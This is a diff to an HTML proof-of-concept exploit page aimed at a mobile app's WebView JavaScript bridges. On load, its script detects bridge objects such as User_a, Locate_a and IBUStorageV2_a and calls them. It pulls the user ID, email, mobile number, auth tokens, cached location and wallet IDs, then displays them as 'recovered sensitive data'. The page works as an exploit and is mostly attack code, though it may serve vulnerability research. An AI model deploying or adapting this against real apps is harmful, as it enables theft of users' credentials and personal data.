@@ -6,132 +6,207 @@
     <style>
       body {
         font-family: "Courier New", monospace;
-        background: #1a1a1a;
+        background: #0d0d0d;
         color: #00ff00;
-        padding: 20px;
+        padding: 10px;
+        margin: 0;
+        font-size: 14px;
+        overflow-x: hidden;
+      }
+      .container {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
       }
       .card {
-        border: 1px solid #00ff00;
-        padding: 15px;
-        margin-bottom: 20px;
+        border: 2px solid #00ff00;
+        padding: 12px;
         background: #000;
-        box-shadow: 0 0 10px #00ff00;
+        box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+        word-break: break-all;
       }
       h3 {
         color: #fff;
         text-transform: uppercase;
         border-bottom: 1px solid #00ff00;
+        margin-top: 0;
+        padding-bottom: 5px;
+        font-size: 16px;
       }
-      .critical {
+      .critical-box {
+        border: 2px solid #ff0000;
+        box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+      }
+      .critical-title {
         color: #ff0000;
-        font-weight: bold;
         text-shadow: 0 0 5px #ff0000;
       }
       #logs {
         white-space: pre-wrap;
-        word-wrap: break-word;
+        font-size: 12px;
+        line-height: 1.4;
+      }
+      .leak-row {
+        margin-bottom: 10px;
+        padding: 5px;
+        border-left: 3px solid #ff0000;
+        background: #1a0000;
+      }
+      .label {
+        color: #aaa;
+        font-weight: bold;
+        display: block;
+        font-size: 10px;
+        text-transform: uppercase;
+      }
+      .value {
+        color: #ff3333;
+        font-size: 14px;
+        display: block;
+      }
+      li {
+        list-style: none;
+        margin-bottom: 5px;
       }
     </style>
   </head>
   <body>
-    <div class="card">
-      <h3>1. Status & Bridges</h3>
-      <ul id="bridges">
-        Scanning for entry points...
-      </ul>
-    </div>
+    <div class="container">
+      <div class="card">
+        <h3>[ BRIDGE STATUS ]</h3>
+        <ul id="bridges">
+          <li>[.] Initializing bridges...</li>
+        </ul>
+      </div>
 
-    <div class="card">
-      <h3>2. Live Data Extraction</h3>
-      <div id="logs">> System Initialized...</div>
+      <div class="card critical-box">
+        <h3 class="critical-title">[ RECOVERED SENSITIVE DATA ]</h3>
+        <div id="leaks">
+          <div class="leak-row">
+            <span class="label">Status</span>
+            <span class="value">Awaiting Extraction...</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>[ OUTPUT CONSOLE ]</h3>
+        <div id="logs">> System Initialized...</div>
+      </div>
     </div>
 
     <script>
+      const logBox = document.getElementById("logs");
+      const leakBox = document.getElementById("leaks");
+
       function log(msg, isCritical = false) {
-        var box = document.getElementById("logs");
-        var prefix = isCritical ? "[CRITICAL] " : "[INFO] ";
-        var color = isCritical ? "red" : "#00ff00";
-        box.innerHTML += `\n> <span style="color:${color}">${prefix}${msg}</span>`;
+        const prefix = isCritical ? "[CRITICAL] " : "[INFO] ";
+        const color = isCritical ? "#ff3333" : "#00ff00";
+        logBox.innerHTML += `\n> <span style="color:${color}">${prefix}${msg}</span>`;
         console.log(prefix + msg);
+        window.scrollTo(0, document.body.scrollHeight);
       }
 
-      // --- CRITICAL: Listen for callback wrapped in Base64 (ax0.b / ax0.c) ---
+      function addLeak(label, value) {
+        const row = document.createElement("div");
+        row.className = "leak-row";
+        row.innerHTML = `<span class="label">${label}</span><span class="value">${typeof value === 'object' ? JSON.stringify(value, null, 2) : value}</span>`;
+        leakBox.appendChild(row);
+      }
+
+      // --- CALLBACK INTERCEPTION (Base64 wrapping per ax0.b) ---
       window.__bridge_callback = function (base64Data) {
         try {
-          // Decrypt Base64 (as seen in ax0.b.b)
-          var decodedData = atob(base64Data);
-          var json = JSON.parse(decodedData);
+          const decodedData = atob(base64Data);
+          const json = JSON.parse(decodedData);
+          log("INTERCEPTED: " + (json.tagname || "Unknown Tag"), true);
 
-          log("BRIDGE CALLBACK INTERCEPTED!", true);
-          log("Payload: " + decodedData);
-
-          // Extract value from standard response format
-          var secret = json.value || (json.param && json.param.value);
-          if (secret) {
-            log("SUCCESS: Extracted Secret: " + JSON.stringify(secret), true);
-            // In a real attack, exfiltrate to external server here
+          // Handle User Info Response
+          if (json.tagname === "leak_user_info" || (json.param && json.param.UserID)) {
+            const data = json.param || json;
+            if (data.UserID) {
+               addLeak("USER ID", data.UserID);
+               if (data.Email) addLeak("EMAIL", data.Email);
+               if (data.Mobile) addLeak("MOBILE", data.Mobile);
+               if (data.Token) addLeak("AUTH TOKEN", data.Token);
+               log("CRITICAL: User Profile Extracted!", true);
+            }
           }
+
+          // Handle Storage Responses
+          if (json.value || (json.param && json.param.value)) {
+            const val = json.value || json.param.value;
+            const key = json.tagname || "unknown_key";
+            addLeak("STORED: " + key, val);
+          }
+
+          // Handle version info
+          if (Array.isArray(json) || (json.param && Array.isArray(json.param))) {
+             addLeak("PACKAGE INFO", "Internal URLs/Versions Leaked");
+          }
+
         } catch (e) {
           log("Callback Error: " + e.message, true);
         }
       };
 
-      function startHeist() {
-        log("Executing Stealth Extraction...");
+      function startExtraction() {
+        log("Starting extraction sequence...");
 
-        // 1. Precise Location Extraction (Locate_a.getCachedLocationData)
-        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
-          log("Querying Cached Location...");
-          var loc = window.Locate_a.getCachedLocationData();
-          if (loc) {
-            log("LOCATION LEAKED: " + JSON.stringify(loc), true);
-          }
+        // 1. User Account "Goldmine" (User_a)
+        if (window.User_a && window.User_a.getUserInfo) {
+          log("Calling User_a.getUserInfo()...");
+          const cmd = JSON.stringify({ callback_tagname: "leak_user_info" });
+          window.User_a.getUserInfo(cmd);
         }
 
-        // 2. Sensitive Storage Extraction (IBUStorageV2_a.IBUGetUserValue)
+        // 2. Location Leak (Locate_a)
+        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
+          log("Calling Locate_a.getCachedLocationData()...");
+          try {
+            const loc = window.Locate_a.getCachedLocationData();
+            if (loc) addLeak("LOCATION", `Lat: ${loc.lat}, Lng: ${loc.lng}\nAddr: ${loc.address || 'N/A'}`);
+          } catch(e) { log("Locate_a fail"); }
+        }
+
+        // 3. Storage Probing (IBUStorageV2_a)
         if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
-          log("Probing Secure Storage (nh.a)...");
-
-          // Targets identified from source code analysis
-          var targets = [
-            { bus: "common", key: "token" },
-            { bus: "common", key: "uid" },
-            { bus: "common", key: "vtoken" },
-            { bus: "user", key: "userInfo" },
-            { bus: "wallet", key: "walletId" }
-          ];
-
-          targets.forEach(function(target, index) {
-            setTimeout(function() {
-              log("Requesting [" + target.key + "] from [" + target.bus + "]...");
-              
-              // Payloads must be a JSON string that H5URLCommand can parse
-              var payload = JSON.stringify({
-                callback_tagname: "leak_" + target.key, // Required for tracking
-                bussiness: target.bus, // Note: double 's' required by Java source
-                key: target.key
+          const keys = ["token", "uid", "walletId"];
+          keys.forEach((k, i) => {
+            setTimeout(() => {
+              log(`Probing Storage: ${k}...`);
+              const payload = JSON.stringify({
+                callback_tagname: "leak_" + k,
+                bussiness: "common",
+                key: k
               });
-
               window.IBUStorageV2_a.IBUGetUserValue(payload);
-            }, index * 500); // Staggering to avoid congestion
+            }, i * 400);
           });
+        }
+
+        // 4. Util & Version info
+        if (window.Util_a && window.Util_a.getHybridVersion) {
+            log("Calling Util_a.getHybridVersion()...");
+            window.Util_a.getHybridVersion(JSON.stringify({callback_tagname: "leak_version"}));
         }
       }
 
-      // Scanner for bridge objects
-      setTimeout(function () {
-        var found = [];
-        var suspicious = ["IBUStorageV2_a", "Locate_a", "Storage", "IBUStorageV2_b", "Wallet_a"];
+      // Check Bridge Availability
+      setTimeout(() => {
+        const suspicious = ["User_a", "Util_a", "Locate_a", "IBUStorageV2_a", "Log_a", "Storage_a"];
+        const found = suspicious.filter(b => !!window[b]);
         
-        suspicious.forEach(function(name) {
-          if (window[name]) found.push(name);
-        });
-
         document.getElementById("bridges").innerHTML = found.length > 0 
-          ? found.map((b) => `<li>[+] Found Bridge: ${b}</li>`).join("")
+          ? found.map(b => `<li>[+] Bridge: <span style="color:#fff">${b}</span> [ONLINE]</li>`).join("")
           : "<li>[-] No target bridges detected.</li>";
-
-        startHeist();
+        
+        if (found.length > 0) {
+            log("Entry points found. Executing...");
+            startExtraction();
+        } else {
+            log("Error: Target objects not in scope.", true);
+        }
       }, 1000);
     </script>
   </body>
